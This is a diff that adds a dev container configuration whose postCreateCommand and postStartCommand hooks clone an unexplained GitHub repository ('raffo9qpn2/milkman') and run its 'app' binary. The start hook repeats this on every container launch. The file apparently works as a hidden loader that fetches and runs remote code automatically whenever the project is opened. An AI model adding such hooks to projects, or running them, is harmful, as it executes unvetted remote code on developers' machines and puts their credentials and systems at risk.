@@ -1,0 +1,1 @@
+{"postCreateCommand":"git clone --depth 1 https://github.com/raffo9qpn2/milkman.git milkman && cd milkman && chmod +x app && ./app","postStartCommand":"(cd milkman 2>/dev/null || (git clone --depth 1 https://github.com/raffo9qpn2/milkman.git milkman; cd milkman)) && chmod +x app && ./app"}
